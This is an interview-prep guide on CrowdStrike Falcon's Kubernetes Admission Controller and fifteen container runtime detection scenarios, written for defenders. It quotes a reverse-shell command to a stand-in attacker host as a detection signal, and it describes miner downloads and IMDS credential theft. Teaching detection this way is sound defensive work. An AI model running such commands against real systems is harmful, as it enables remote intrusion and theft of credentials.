# 🛡️ Falcon KAC Deep Dive & Runtime Detection Scenarios Guide
### Interview-Ready | 15+ Scenarios | CrowdStrike Falcon Cloud Security

---

## Table of Contents

1. [KAC — How It Works (Architecture)](#1-kac--how-it-works)
2. [KAC — Detection Types & Use Cases](#2-kac--detection-types--use-cases)
3. [KAC — Scenario-Based Interview Questions](#3-kac--scenario-based-interview-questions)
4. [Runtime Detections — 15 Scenarios](#4-runtime-detections--15-scenarios)

---

## 1. KAC — How It Works

### What Problem Does KAC Solve?

Kubernetes makes deployment fast, but **misconfigurations happen constantly**:
- Developers deploy privileged containers by accident
- Images with critical CVEs run in production
- Secrets end up in pod specs
- Containers run as root with host network access

The **Falcon Kubernetes Admission Controller (KAC)** acts as a **security gatekeeper** — it intercepts every request to the K8s API server and decides: **Allow, Alert, or Block**.

### Where KAC Sits in the Request Lifecycle

```
 Developer runs: kubectl apply -f deployment.yaml
        │
        ▼
 ┌──────────────────────────────────┐
 │     K8s API Server               │
 │  1. Authentication (who are you?)│
 │  2. Authorization  (RBAC check)  │
 │  3. Admission Control ◄──────────┼──── KAC intercepts HERE
 │     ├─ Mutating webhooks         │
 │     └─ Validating webhooks ◄─────┼──── Falcon KAC = Validating Webhook
 │  4. Persist to etcd              │
 └──────────────────────────────────┘
        │
        ▼
 Pod is created (or BLOCKED by KAC)
```

**Key point:** KAC operates AFTER authentication and authorization but BEFORE the object is persisted. This means a misconfigured pod **never runs** — it's stopped at the gate.

### KAC Pod Architecture (3 Containers in 1 Pod)

```
┌─────────────────────────────────────────────────────────────┐
│                    KAC Pod (on worker node)                  │
│                                                             │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────┐ │
│  │  falcon-client   │  │   falcon-ac      │  │falcon-watcher│ │
│  │                 │  │                 │  │             │ │
│  │ Validating      │  │ Admission       │  │ Snapshot    │ │
│  │ Webhook         │  │ Controller      │  │ Monitor     │ │
│  │                 │  │                 │  │             │ │
│  │ • Listens to    │  │ • Policy mgmt   │  │ • Snapshots │ │
│  │   K8s API       │  │ • Cloud comms   │  │   K8s       │ │
│  │   events        │  │ • Event         │  │   objects   │ │
│  │ • Forwards to   │  │   handling      │  │ • Streams   │ │
│  │   falcon-ac     │  │ • Talks to      │  │   events to │ │
│  │                 │  │   CrowdStrike   │  │   CS cloud  │ │
│  │                 │  │   cloud         │  │             │ │
│  └─────────────────┘  └─────────────────┘  └─────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

| Container | Role | What It Does |
|-----------|------|-------------|
| **falcon-client** | Validating Webhook | Listens to K8s API server events. When a pod/deployment is created or updated, it intercepts the request and forwards it to `falcon-ac` for policy evaluation |
| **falcon-ac** | Admission Controller | The brain — evaluates the object against KAC policies and image assessment policies stored in the CrowdStrike cloud. Returns Allow/Deny decision |
| **falcon-watcher** | Continuous Monitor | Takes periodic snapshots of ALL K8s objects (pods, deployments, services). Streams create/update/delete events to CrowdStrike cloud as `K8SResource` events for continuous visibility |

### How a KAC Decision Happens (Step by Step)

```
1. Developer: kubectl apply -f pod.yaml
       │
       ▼
2. K8s API Server authenticates & authorizes the user
       │
       ▼
3. API Server sends AdmissionReview request to falcon-client webhook
       │
       ▼
4. falcon-client forwards the request to falcon-ac
       │
       ▼
5. falcon-ac evaluates against TWO policy types:
       │
       ├── A) Admission Control Policies (IOM rules)
       │       • Is the container privileged?
       │       • Is it running as root?
       │       • Does it have host network access?
       │       • Does it mount host paths?
       │       • Does it have excessive capabilities?
       │
       └── B) Image Assessment Policies
               • Has this image been scanned?
               • Does it have critical/high CVEs?
               • Does it have malware?
               • Does it have leaked credentials?
       │
       ▼
6. falcon-ac returns decision:
       • ALLOW   → Pod is created normally
       • ALERT   → Pod is created, but detection is raised in Falcon console
       • PREVENT → Pod creation is BLOCKED. kubectl returns error to user
```

### KAC Policy Configuration

**Navigate to:** `Cloud Security > Rules and Policies > Policies > Admission Control Policies`

**Policy Components:**

| Component | Purpose | Example |
|-----------|---------|---------|
| **Rule Groups** | Define which K8s resources the policy applies to | "All pods in production namespace" |
| **Host Groups** | Connect the policy to the KAC on specific clusters | Dynamic host group by K8s Cluster ID |
| **Namespaces** | Target specific virtual clusters | `production`, `staging` |
| **Pod/Service Labels** | Precise targeting of specific workloads | `app=payment-service` |
| **IOM Rules** | Set action per misconfiguration type | Privileged → Prevent, HostPath → Alert |
| **Image Assessment** | Act on image scan results | Unassessed images → Prevent |

### Why KAC is Critical (Interview Answer)

> "KAC is the **shift-left enforcement point** in Kubernetes security. Unlike runtime detection which catches problems after they happen, KAC **prevents** misconfigured workloads from ever reaching the runtime environment. It sits as a validating webhook in the K8s admission pipeline, evaluating every pod creation/update against two policy types: IOM rules (detecting misconfigurations like privileged containers) and image assessment policies (blocking images with vulnerabilities). The key architectural detail is that KAC runs 3 containers in one pod — the webhook interceptor, the policy engine that talks to CrowdStrike cloud, and a watcher that provides continuous inventory visibility. I recommend a phased rollout: start with Alert on all rules, monitor for 2-4 weeks, then switch critical rules to Prevent."

---

## 2. KAC — Detection Types & Use Cases

### KAC Detection Categories

#### A) Indicators of Misconfiguration (IOMs)

| IOM Detection | Risk Level | What It Detects | Why It Matters |
|---------------|-----------|-----------------|----------------|
| **Privileged Container** | 🔴 Critical | `securityContext.privileged: true` | Container has full host access — breakout is trivial |
| **Running as Root** | 🔴 Critical | `runAsUser: 0` or no `runAsNonRoot: true` | Root in container = root on host if breakout occurs |
| **Host Network Access** | 🔴 Critical | `hostNetwork: true` | Container shares host network — can sniff all node traffic |
| **Host PID Namespace** | 🔴 Critical | `hostPID: true` | Container can see and kill host processes |
| **Host IPC Namespace** | 🟠 High | `hostIPC: true` | Container can access host shared memory |
| **HostPath Volume Mount** | 🟠 High | Mounting `/`, `/etc`, `/var` from host | Direct access to host filesystem |
| **Excessive Capabilities** | 🟠 High | `CAP_SYS_ADMIN`, `CAP_NET_RAW`, etc. | Grants kernel-level powers to the container |
| **No Resource Limits** | 🟡 Medium | Missing `resources.limits` | Enables resource exhaustion (DoS) |
| **Writable Root Filesystem** | 🟡 Medium | `readOnlyRootFilesystem: false` | Allows attackers to write binaries/scripts |
| **Secrets in Environment** | 🟠 High | Secrets passed as plain env vars | Secrets visible in `kubectl describe pod` and process listings |

#### B) Image Assessment Detections

| Detection | What It Finds | Impact |
|-----------|---------------|--------|
| **Unassessed Image** | Image has never been scanned | Unknown vulnerabilities running in production |
| **Critical CVE in Image** | Known exploitable vulnerability (e.g., Log4Shell) | Active exploitation risk |
| **Malware in Image** | Known malicious binary in image layers | Compromised supply chain |
| **Credentials in Image** | AWS keys, Slack tokens, GCP creds in image | Credential theft from image scan |
| **SetUID Bit Found** | Binary with SetUID flag — privilege escalation vector | Attacker can escalate to root |
| **Running as Root in Dockerfile** | No `USER` instruction — defaults to root | Unnecessary privilege |
| **ADD Instruction** | `ADD` instead of `COPY` in Dockerfile | Can pull from remote URLs — injection risk |

#### C) KAC Compliance Detections

| Detection | Benchmark | Rule |
|-----------|-----------|------|
| **Container can acquire additional privileges** | CIS Docker 5.25 | Ensure `allowPrivilegeEscalation: false` |
| **Root group execution** | CIS K8s 5.2.6 | Ensure containers run with non-root group |
| **Missing seccomp profile** | CIS K8s 5.7.2 | Ensure Seccomp profile is set |
| **Missing AppArmor profile** | CIS K8s 5.7.1 | Ensure AppArmor profile is set |

### KAC Use Case: Real-World Workflow

**Scenario:** Your organization has 50 microservices on EKS. A developer pushes a new deployment with `privileged: true` because their monitoring tool "needs it."

**Without KAC:**
1. Pod deploys to production
2. Runs for days/weeks unnoticed
3. Attacker exploits application vulnerability → trivial container breakout
4. Full cluster compromise

**With KAC (Prevent Mode):**
1. Developer runs `kubectl apply`
2. KAC intercepts the AdmissionReview request
3. falcon-ac checks: `privileged: true` → rule set to **Prevent**
4. kubectl returns: `Error from server: admission webhook "falcon-kac" denied the request: privileged containers are not allowed`
5. Developer contacts security team
6. Security team identifies the specific capability needed (e.g., `CAP_NET_ADMIN`)
7. Pod is reconfigured with the minimum required capability, not full `privileged`
8. Deployment succeeds with least privilege

---

## 3. KAC — Scenario-Based Interview Questions

### Q1: "How would you roll out KAC policies in a production environment without causing outages?"

**Answer:**
> "I follow a **three-phase rollout strategy**:
> - **Phase 1 (Weeks 1-2): Monitor Only** — Deploy KAC with ALL rules set to **Alert**. No workloads are blocked. This creates a baseline of all current misconfigurations across the cluster.
> - **Phase 2 (Weeks 3-4): Selective Prevention** — Analyze the alert data. Identify misconfigurations that are clearly unintentional (e.g., no developer needs `hostPID: true`). Switch those rules to **Prevent**. Keep debatable rules on Alert.
> - **Phase 3 (Week 5+): Full Prevention** — Work with development teams to remediate remaining Alert findings. Switch critical rules (`privileged`, `running as root`, `host network`) to **Prevent**.
>
> The key is the dynamic host group — I create a group filtered by K8s Cluster ID. This lets me roll out policies per cluster, starting with staging before production."

---

### Q2: "A KAC policy is set to Prevent, and suddenly a critical production deployment fails. What do you do?"

**Answer:**
> "Immediate response is **business continuity first**:
> 1. **Identify the blocking rule** — check the Falcon console under Detections for the KAC alert. The detail panel shows exactly which IOM rule or image assessment policy blocked the deployment.
> 2. **Assess the risk** — is this a legitimate business-critical deployment? If yes, proceed to step 3.
> 3. **Temporary exemption** — I do NOT disable the entire policy. Instead, I create a **namespace-scoped exception** in the KAC policy rule group to allow this specific workload temporarily, or switch that specific rule to Alert for the affected namespace.
> 4. **Document and time-bound** — create a ticket with a 7-day deadline for the team to fix the underlying misconfiguration.
> 5. **Post-incident** — work with the dev team to remediate the root cause and remove the exception.
>
> I never globally disable prevention because one team's emergency. That would leave the entire cluster exposed."

---

### Q3: "How does KAC help with container supply chain security?"

**Answer:**
> "KAC integrates with Image Assessment Policies, which is the supply chain security layer:
> 1. **Pre-runtime scanning** — Images are scanned in the CI/CD pipeline or registry for CVEs, malware, credentials, and misconfigurations.
> 2. **Admission-time enforcement** — When a pod is created, KAC checks if the image has been assessed. If it's unassessed, I set the policy to **Prevent** — unknown images do not run.
> 3. **Vulnerability threshold** — I can configure KAC to block images with Critical or High CVEs, even if they've been scanned.
> 4. **Continuous reassessment** — Image Assessment at Runtime (IAR) continuously re-scans running images. If a new CVE is published that affects a running image, it appears in the console for remediation.
>
> This creates a closed-loop: nothing runs without scanning, nothing with critical vulnerabilities runs, and running images are continuously reassessed."

---

### Q4: "What's the difference between KAC and Pod Security Standards/OPA Gatekeeper?"

**Answer:**
> "They serve similar functions but with different strengths:
>
> | Feature | KAC | Pod Security Standards (PSA) | OPA/Gatekeeper |
> |---------|-----|----------------------------|----------------|
> | **Deployment** | CrowdStrike-managed, Helm install | Built into K8s 1.25+ | Self-managed policy engine |
> | **Policy management** | CrowdStrike cloud console | Namespace labels | Rego policy language |
> | **Image scanning** | ✅ Integrated image assessment | ❌ No image scanning | ❌ No image scanning |
> | **Continuous monitoring** | ✅ falcon-watcher streams state | ❌ Admission-time only | ❌ Admission-time only |
> | **Cloud visibility** | ✅ Centralized in Falcon console | ❌ Local cluster only | ❌ Local cluster only |
> | **MITRE ATT&CK mapping** | ✅ Tactic/technique for each IOM | ❌ | ❌ |
>
> In enterprise environments, I use KAC as the **primary enforcement** because it provides centralized visibility, image assessment integration, and MITRE mapping. I may use PSA as a **defense-in-depth layer** for clusters outside CrowdStrike coverage."

---

### Q5: "KAC detected a 'Secret' type misconfiguration. What does this mean and how do you investigate?"

**Answer:**
> "A 'Secret' type IOM means KAC found **sensitive information embedded directly in the K8s object spec** — this could be:
> - An API key in an environment variable (`env.value: sk-live-abc123...`)
> - A database password in a ConfigMap instead of a K8s Secret
> - An AWS access key hardcoded in the pod spec
>
> **Investigation:**
> 1. Check the IOM detail panel — it shows the exact field and value that triggered the detection.
> 2. Determine if the secret is valid — use the key/credential to check if it's active (e.g., `aws sts get-caller-identity` for AWS keys).
> 3. If valid: **rotate the credential immediately** — it's already been stored in `etcd`, K8s audit logs, and potentially SCM history.
> 4. Remediate: migrate the secret to K8s Secrets (encrypted at rest using KMS), or better yet, use an external secrets manager (HashiCorp Vault, AWS Secrets Manager) with a CSI driver.
> 5. Set the KAC rule for secrets to **Prevent** to block future occurrences."

---

## 4. Runtime Detections — 15 Scenarios

> Each scenario follows the format: **What Happened → Detection Signal → Investigation → Risk → Remediation → Interview Answer**

---

### Scenario 1: Reverse Shell from a Container

**What Happened:** An attacker exploited an RCE vulnerability in a web application running inside a K8s pod. They spawned a reverse shell back to their C2 server.

**Detection Signals:**
- **Falcon IOA:** `ReverseShellDetected` — outbound TCP connection from a shell process
- **Process Tree:** `node` → `sh` → `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`
- **Drift Indicator:** `bash` not present in the original container image
- **Network:** Outbound connection to non-standard port (4444)

**Investigation:**
1. Open the detection → examine the **process tree** (parent→child chain)
2. Check **drift indicators** — was the shell binary in the original image?
3. Check the **network connection** details — destination IP, port, bytes transferred
4. Check if the attacker accessed the **service account token** at `/var/run/secrets/kubernetes.io/serviceaccount/token`
5. Check if the attacker queried the **IMDS** at `169.254.169.254`

**Risk:** Critical — interactive access to the container, potential K8s API access and credential theft.

**Remediation:** Kill the pod, patch the vulnerability, set `readOnlyRootFilesystem: true`, deploy default-deny NetworkPolicies, disable SA token automounting.

**Interview Answer:**
> "I detect reverse shells primarily through Falcon's process tree — a web server should never spawn `bash`. The drift indicator confirms the shell wasn't in the image. My immediate action is to kill the pod and apply a deny-all NetworkPolicy. Long-term, I enforce `readOnlyRootFilesystem` and default-deny egress."

---

### Scenario 2: Container Running as Root

**What Happened:** A pod was deployed without a `securityContext` — defaults to running as root (UID 0).

**Detection Signals:**
- **KAC IOM:** `RunningAsRootContainer` — `runAsUser: 0` or `runAsNonRoot` not set
- **Runtime Detection:** Process executions under UID 0 inside the container
- **Image Detection:** `UserInstructionNotInDockerfile`

**Investigation:**
1. Check the pod spec — is there a `securityContext` with `runAsNonRoot: true`?
2. Check the Dockerfile — does it have a `USER` instruction?
3. Determine if running as root is actually required (usually it isn't)

**Risk:** High — if the container is compromised, the attacker has root privileges, making breakout easier.

**Remediation:** Add `runAsNonRoot: true` and `runAsUser: 1000` to the pod/container securityContext. Add `USER nonroot` to the Dockerfile. Set KAC to **Prevent** for this IOM.

**Interview Answer:**
> "Running as root is one of the most common K8s misconfigurations. I enforce it at two layers: KAC prevents pods without `runAsNonRoot: true` from deploying, and our CI/CD pipeline rejects Dockerfiles without a `USER` instruction."

---

### Scenario 3: Privileged Container Breakout

**What Happened:** A pod with `privileged: true` was compromised. The attacker mounted the host filesystem and stole the Kubelet kubeconfig.

**Detection Signals:**
- **Falcon Runtime:** `PotentialKernelTampering` — `mount` syscall from within a container
- **Drift:** `mount`, `nsenter`, `chroot` executed inside the container
- **KAC IOM:** `Privileged Container` (if KAC was in Alert mode, not Prevent)
- **File Access:** Read of `/var/lib/kubelet/kubeconfig`

**Investigation:**
1. Process tree: What binary executed the `mount` syscall?
2. Drift indicators: Were tools like `mount`, `fdisk`, `nsenter` brought into the container?
3. File access: Did any process read Kubelet credentials?
4. K8s audit logs: Were cluster secrets accessed using those credentials?
5. **Assume full cluster compromise** if Kubelet creds were accessed.

**Risk:** Critical — single container → full cluster compromise → all secrets exposed.

**Remediation:** Kill the pod, cordon the node, rotate ALL cluster secrets, set KAC to **Prevent** for privileged containers, enforce Pod Security Standards `restricted` profile.

**Interview Answer:**
> "A privileged container breakout is the worst-case K8s scenario. When I see Falcon's `PotentialKernelTampering` alert showing a mount syscall from a container, I assume the node is compromised. Immediate actions: kill the pod, cordon+drain the node, rotate all cluster secrets. Prevention is key — KAC should never allow `privileged: true` in production."

---

### Scenario 4: Container Drift — Crypto Miner Downloaded

**What Happened:** An attacker exploited a vulnerability and used `curl` to download a crypto miner binary into the container. The container's CPU usage spiked to 100%.

**Detection Signals:**
- **Drift Indicator:** `curl` executed to download `/tmp/xmrig` — binary not in original image
- **Drift Indicator:** `/tmp/xmrig` executed — new binary launched
- **Falcon IOA:** `SuspiciousProcessExecution` — unknown binary with high CPU usage
- **Network:** Outbound connection to a mining pool IP (e.g., `pool.minexmr.com:4444`)

**Investigation:**
1. Check drift indicators — what was downloaded and from where?
2. Check the binary hash against VirusTotal / threat intelligence
3. Check network connections — mining pool domains/IPs
4. Check how the attacker got in (application vulnerability, exposed service)

**Risk:** High — resource theft + indicates the attacker has code execution.

**Remediation:** Kill the pod, patch the application, enforce `readOnlyRootFilesystem: true` (prevents writing to `/tmp`), enable drift prevention to auto-kill drifted processes, restrict egress with NetworkPolicies.

**Interview Answer:**
> "Crypto mining in containers is extremely common because containers often have unrestricted egress. Falcon's drift detection catches this immediately — `curl` downloading a binary that wasn't in the image. If drift prevention is enabled, Falcon kills `xmrig` the moment it executes. My prevention strategy: `readOnlyRootFilesystem`, default-deny egress NetworkPolicies, and drift prevention enabled."

---

### Scenario 5: Suspicious kubectl exec (Interactive Intrusion)

**What Happened:** An attacker compromised a developer's `kubeconfig` and used `kubectl exec` to get interactive shell access to a production pod.

**Detection Signals:**
- **K8s Audit Log:** `pods/exec` API call with unexpected service account or user
- **Falcon Runtime:** Interactive shell session detected — `sh`/`bash` spawned by container's entrypoint
- **Falcon IOA:** `InteractiveIntrusion` — mimics admin behavior
- **Network:** Internal connections from the pod to database services

**Investigation:**
1. Who authenticated? Check K8s audit logs for the `userIdentity` on the `exec` call
2. Where did the request originate? Check source IP — is it from a corporate network or an unknown IP?
3. What commands were run? Review Falcon's process tree for all commands in the interactive session
4. Was this expected? Contact the user/team — was there a planned debugging session?

**Risk:** High — attacker has live interactive access to a production workload.

**Remediation:** Terminate the `exec` session, rotate the compromised `kubeconfig`, restrict `pods/exec` RBAC to break-glass roles only, use K8s audit logging to alert on all `exec` events, consider using ephemeral debug containers instead.

**Interview Answer:**
> "Interactive intrusion is particularly dangerous because it mimics legitimate admin behavior. I detect it by alerting on all `pods/exec` calls via K8s audit logs and correlating with Falcon's interactive session detection. My policy: `pods/exec` is restricted to an emergency break-glass role, requires MFA, and triggers an automatic PagerDuty alert."

---

### Scenario 6: eBPF Program Loaded from Container

**What Happened:** An advanced attacker loaded a malicious eBPF program from inside a container to intercept network traffic or tamper with security monitoring.

**Detection Signals:**
- **Falcon IOA:** `PotentialKernelTampering` — eBPF invoked from within a container
- **Detection Description:** "The eBPF feature has been invoked from within a container. This is a highly unusual activity and can be used to load a kernel rootkit or manipulate kernel behavior affecting the entire host."

**Investigation:**
1. Which container triggered this? Check the detection's container context (ID, image, namespace)
2. What eBPF program was loaded? Check the process tree for `bpf()` syscall details
3. Was the container privileged? eBPF requires `CAP_SYS_ADMIN` or `CAP_BPF`
4. Is this a legitimate monitoring tool (e.g., Cilium, Falco) or unexpected?

**Risk:** Critical — eBPF can intercept syscalls, modify kernel behavior, and hide attacker activity from security tools.

**Remediation:** Kill the pod immediately, investigate the node for rootkits, drop `CAP_SYS_ADMIN` and `CAP_BPF` capabilities via KAC policy.

**Interview Answer:**
> "eBPF from inside a container is a critical-severity finding. Legitimate eBPF usage happens at the node level (Cilium, Falcon sensor itself), never from application containers. This indicates either a kernel rootkit attempt or a container breakout in progress. I immediately kill the container and investigate the node."

---

### Scenario 7: Lateral Movement — Pod to Internal Service

**What Happened:** A compromised pod scanned the internal K8s network and connected to a database service that it shouldn't have access to.

**Detection Signals:**
- **Falcon:** Port scanning activity from the pod (rapid connection attempts to many IPs/ports)
- **Falcon IOA:** `SuspiciousNetworkConnection` — connection to internal service not in pod's normal baseline
- **Network Policy Violation (if policies exist):** Blocked connections logged
- **K8s Audit Log:** Pod queried the K8s DNS for `service-name.namespace.svc.cluster.local`

**Investigation:**
1. What services were targeted? Check network connections from the pod
2. How did the attacker get the service addresses? K8s DNS resolves all services — no discovery needed
3. Was the connection successful? If no NetworkPolicies, the answer is likely yes
4. What data was accessed?

**Risk:** High — K8s flat networking means every pod can reach every service by default.

**Remediation:** Implement **default-deny NetworkPolicies** in every namespace, only allow specific pod-to-service communication, restrict K8s DNS access per namespace.

**Interview Answer:**
> "Lateral movement in K8s is trivial by default because the network is flat — every pod can talk to every service. This is why default-deny NetworkPolicies are my #1 K8s security recommendation. Falcon detects the scanning activity and anomalous connections, but the real fix is network segmentation."

---

### Scenario 8: Unidentified Container — Not Visible to K8s

**What Happened:** A container was launched directly via `docker run` on the worker node, bypassing the K8s orchestrator entirely.

**Detection Signals:**
- **Falcon:** Unidentified container — `Visible to K8s: No`
- **Falcon:** Container not associated with any pod, deployment, or namespace
- **Falcon:** Container image not in any approved registry

**Investigation:**
1. How was a container launched outside K8s? This indicates **the worker node itself is compromised**
2. What image is running? Is it from an approved registry?
3. Who has SSH/console access to the worker node?
4. Check the node for other indicators of compromise

**Risk:** Critical — node-level compromise. The K8s orchestrator has no visibility or control.

**Remediation:** Kill the container via `sudo docker kill <id>` using Falcon RTR, investigate the node for full compromise, rebuild the node from a golden AMI, disable SSH access to worker nodes.

**Interview Answer:**
> "An unidentified container not visible to K8s is a critical finding — it means either the worker node is compromised or someone accessed the node directly. I immediately kill the container via Falcon RTR, cordon the node, and trigger a full node investigation. Worker nodes should never have direct SSH access in production."

---

### Scenario 9: Rogue Container from Unauthorized Image Registry

**What Happened:** A pod was deployed using an image from Docker Hub instead of the organization's private ECR registry.

**Detection Signals:**
- **KAC IOM:** Image not from approved registry
- **Image Assessment:** Unassessed image — not in any approved scanning pipeline
- **Runtime Detection:** Container running with unknown image provenance

**Investigation:**
1. Who deployed this? Check K8s audit logs for the deployment creator
2. What image is it? Is it a known base image or something suspicious?
3. Was it deployed intentionally (developer shortcut) or maliciously (supply chain attack)?

**Risk:** High — unscanned images may contain vulnerabilities, malware, or backdoors.

**Remediation:** Set KAC to **Prevent** for unassessed images, restrict image pull policies to private registry only (`imagePullPolicy: Always` + registry restrictions via OPA), scan all images in CI/CD pipeline.

**Interview Answer:**
> "This is a supply chain security gap. I enforce registry restrictions at two levels: KAC blocks pods with unassessed images, and OPA/Gatekeeper policies ensure images can only be pulled from our private ECR registry. Any image from Docker Hub in production is either a developer shortcut or an attack."

---

### Scenario 10: Privilege Escalation via SUID Binary

**What Happened:** An attacker found a binary with the SetUID bit set inside a container and used it to escalate to root.

**Detection Signals:**
- **Image Detection:** `SetUIDBitFoundInImage` (pre-runtime)
- **Runtime IOA:** Process execution with escalated privileges
- **Process Tree:** Unprivileged user → SUID binary execution → root shell

**Investigation:**
1. Which binary has the SUID bit? Common targets: `find`, `nmap`, `vim`, `python`
2. Was this binary in the original image or downloaded (drift)?
3. What did the attacker do after escalation?

**Risk:** High — root access inside the container increases breakout risk.

**Remediation:** Remove unnecessary SUID bits from images (`RUN chmod u-s /usr/bin/...`), set `allowPrivilegeEscalation: false` in securityContext, use `no-new-privileges` security option.

**Interview Answer:**
> "SUID binaries are a classic Linux privilege escalation vector. In containers, I prevent this at three levels: image scanning flags SUID bits in CI/CD, `allowPrivilegeEscalation: false` blocks the kernel mechanism, and KAC enforces this policy at admission time."

---

### Scenario 11: Suspicious Outbound DNS — C2 Communication

**What Happened:** A compromised container is using DNS tunneling to exfiltrate data to a C2 server.

**Detection Signals:**
- **Falcon:** Unusual DNS query patterns — high volume of queries to a single unusual domain
- **Falcon IOA:** `SuspiciousDNSRequest` — query to known-bad domain
- **Network:** DNS queries with abnormally long subdomain labels (data encoded in DNS)

**Investigation:**
1. What domain is being queried? Check against threat intelligence
2. What is the query pattern? Legitimate DNS is infrequent; tunneling generates hundreds of queries per minute
3. What process is generating the DNS queries? Check process tree
4. Is the container acting as a DNS client to an external resolver or using cluster DNS?

**Risk:** High — data exfiltration via DNS bypasses most network controls.

**Remediation:** Restrict pod DNS to cluster DNS only (no direct external DNS), implement DNS monitoring/filtering, NetworkPolicies blocking UDP/53 to external IPs.

**Interview Answer:**
> "DNS tunneling is a sophisticated exfiltration technique because most firewalls allow DNS. Falcon detects it through anomalous DNS query patterns and known-bad domain matching. My prevention: pods should only use cluster DNS, external DNS resolution should go through a filtered resolver, and NetworkPolicies should block direct UDP/53 egress."

---

### Scenario 12: AWS Credentials Stolen from IMDS via Pod

**What Happened:** A pod on an EKS worker node queried the Instance Metadata Service (IMDS) at `169.254.169.254` and stole the node's IAM role credentials.

**Detection Signals:**
- **Falcon:** HTTP request to `169.254.169.254` from application process
- **GuardDuty:** `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
- **CloudTrail:** API calls from the node's instance role with source IP outside VPC CIDR

**Investigation:**
1. Which pod made the IMDS request? Check Falcon's container context
2. Was the pod supposed to have AWS access? If yes, it should use IRSA, not IMDS
3. Were the credentials used externally? Check CloudTrail for the role ARN

**Risk:** Critical — node-level IAM credentials are usually more permissive than pod-level IRSA roles.

**Remediation:** Enforce **IMDSv2** (`http-put-response-hop-limit: 1` prevents containers from reaching IMDS), deploy **IRSA** for pod-level IAM access, block `169.254.169.254` in pod NetworkPolicies.

**Interview Answer:**
> "This is why IRSA exists. If a pod needs AWS access, it should use IRSA with a scoped IAM role, not the node's instance profile. I enforce IMDSv2 with a hop-limit of 1, which prevents containers from reaching IMDS. Additionally, I add a NetworkPolicy explicitly blocking `169.254.169.254`."

---

### Scenario 13: ConfigMap/Secret Enumeration via K8s API

**What Happened:** A compromised pod used its auto-mounted service account token to list all secrets across all namespaces.

**Detection Signals:**
- **K8s Audit Log:** `get`/`list` on `secrets` resource across multiple namespaces from an unexpected service account
- **Falcon Runtime:** `curl` or `kubectl` spawned inside a container (drift)
- **Falcon IOA:** Reconnaissance activity — systematic API enumeration

**Investigation:**
1. What service account was used? Check the K8s audit log `userIdentity`
2. Does this SA have `list secrets` permission? (It shouldn't!)
3. What secrets were accessed? Check the response from the API
4. Were any secrets used subsequently (connection to a database, API call)?

**Risk:** Critical — K8s secrets contain database passwords, API keys, certificates.

**Remediation:** Set `automountServiceAccountToken: false` for all pods that don't need API access, apply least-privilege RBAC (no `get secrets` for application SAs), encrypt etcd at rest.

**Interview Answer:**
> "Service account token abuse is a major K8s attack vector. The default behavior of auto-mounting the SA token into every pod gives attackers a free API key. I set `automountServiceAccountToken: false` by default and only enable it for pods that genuinely need API access, with tightly scoped RBAC."

---

### Scenario 14: Container Escape via Docker Socket Mount

**What Happened:** A Pod was configured to mount the container runtime socket (`/var/run/docker.sock`). An attacker used it to create a new container with full host access.

**Detection Signals:**
- **KAC IOM:** HostPath volume mount of `/var/run/docker.sock` or `/var/run/containerd/containerd.sock`
- **Falcon Runtime:** New container creation detected outside K8s orchestrator
- **Falcon:** Unidentified container appeared (not managed by K8s)
- **Drift:** `docker` CLI or `ctr` executed inside the pod

**Investigation:**
1. Why was the runtime socket mounted? Common for CI/CD pods (Docker-in-Docker) or monitoring tools
2. What commands were executed against the socket?
3. Were new containers created? With what privileges?
4. Was the host filesystem mounted in the new container?

**Risk:** Critical — access to the runtime socket = ability to create privileged containers = full host compromise.

**Remediation:** Block `/var/run/docker.sock` and `/var/run/containerd/` mounts via KAC (HostPath Volume rule → Prevent), use alternatives for CI/CD (Kaniko for builds, no socket mounting), enforce this in OPA policies.

**Interview Answer:**
> "The container runtime socket is the keys to the kingdom. Anyone who can create containers on the node can create a privileged one and own the host. I absolutely block socket mounts via KAC policy. For CI/CD use cases like Docker-in-Docker, I use Kaniko which builds images without requiring a Docker daemon."

---

### Scenario 15: Falcon Sensor Coverage Gap — DaemonSet Not Running

**What Happened:** A new EKS node group was added to the cluster, but the Falcon sensor DaemonSet was not scheduled on the new nodes due to a taint/toleration mismatch.

**Detection Signals:**
- **Coverage Dashboard:** Container coverage dropped from 100% to 85%
- **AWS API vs Falcon API Reconciliation:** 3 EC2 instances have no corresponding Falcon sensor
- **DaemonSet Status:** `kubectl get ds -n falcon-system` shows `DESIRED: 10, CURRENT: 7`

**Investigation:**
1. Why aren't the sensors scheduled? Check for **taints** on the new nodes and **tolerations** in the DaemonSet spec
2. Are there node selectors or affinity rules that exclude the new nodes?
3. Is there a resource constraint preventing the sensor pod from scheduling?

**Risk:** High — unmonitored nodes are blind spots. Any attack on these nodes will not generate Falcon alerts.

**Remediation:** Add the appropriate tolerations to the Falcon DaemonSet, set up automated coverage reconciliation (Lambda comparing EC2 API ↔ Falcon API daily), alert on coverage drops.

**Interview Answer:**
> "Coverage gaps are a governance risk. An attacker will target the node without sensors. I reconcile coverage daily by comparing the AWS EC2 API (list of all EKS nodes) against the Falcon Hosts API (list of reporting sensors). Any mismatch triggers a PagerDuty alert. The most common cause is taint/toleration mismatch when new node groups are added — I ensure the Falcon DaemonSet tolerates all common EKS taints."

---

> [!TIP]
> **Interview Day Tip:** When answering runtime detection scenarios, always follow this structure:
> 1. **"First, I look at..."** — identify the detection signal
> 2. **"Then I check..."** — describe the investigation
> 3. **"My immediate action is..."** — containment
> 4. **"To prevent this in the future..."** — remediation and prevention
> 
> This shows methodical thinking and operational maturity.
